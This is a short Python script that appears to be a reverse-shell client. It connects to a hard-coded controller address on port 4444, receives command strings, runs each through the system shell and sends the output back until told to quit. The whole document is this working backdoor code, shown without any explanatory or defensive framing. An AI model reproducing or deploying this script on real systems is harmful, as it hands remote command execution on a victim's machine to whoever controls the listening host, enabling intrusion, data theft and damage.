import sys
import socket
import subprocess

SERVER_IP = "192.168.1.254"
PORT = 4444

s = socket.socket()
s.connect((SERVER_IP, PORT))

msg = s.recv(1024).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] received command: {cmd}')

    if cmd.lower() in ['q', 'quit', 'exit', 'x']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed Successfully'.encode()

    s.send(result)

s.close()
